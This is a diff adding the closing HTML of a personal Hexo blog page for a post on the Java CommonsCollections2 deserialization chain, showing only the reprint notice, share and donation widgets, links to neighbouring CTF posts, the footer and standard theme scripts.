+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">kingkb</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://kingofkb.github.io/2022/09/02/Java%20CommonsCollections2%E9%93%BE%E5%AD%A6%E4%B9%A0/">http://kingofkb.github.io/2022/09/02/Java%20CommonsCollections2%E9%93%BE%E5%AD%A6%E4%B9%A0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">kingkb</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">java反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/10/18/can%20can%20need%20picture/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/zshz6.jpeg" class="responsive-img" alt="TSCTF-J 2022 can can need picture题解以及出题感悟">
+                        
+                        <span class="card-title">TSCTF-J 2022 can can need picture题解以及出题感悟</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            pop链，无参数RCE，杂谈
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-18
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pop%E9%93%BE-%E6%97%A0%E5%8F%82%E6%95%B0RCE-%E6%9D%82%E8%B0%88/">
+                        <span class="chip bg-color">pop链 无参数RCE 杂谈</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/08/29/%E4%BD%BF%E7%94%A8docker%E5%9C%A8CentOS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BD%91%E9%A1%B5/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/zshz4.jpeg" class="responsive-img" alt="使用docker在CentOS服务器部署网页">
+                        
+                        <span class="card-title">使用docker在CentOS服务器部署网页</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            docker远端部署
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/vps/">
+                        <span class="chip bg-color">vps</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">kingkb</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
+                        class="white-color">64.2k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/kingofkb" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1527411491@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1527411491" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1527411491" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="https://space.bilibili.com/283283733?spm_id_from=333.1007.0.0" class="tooltipped" target="_blank" data-tooltip="关注我的B站" data-position="top" data-delay="50">
+        <i class="fa-brands fa-bilibili"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
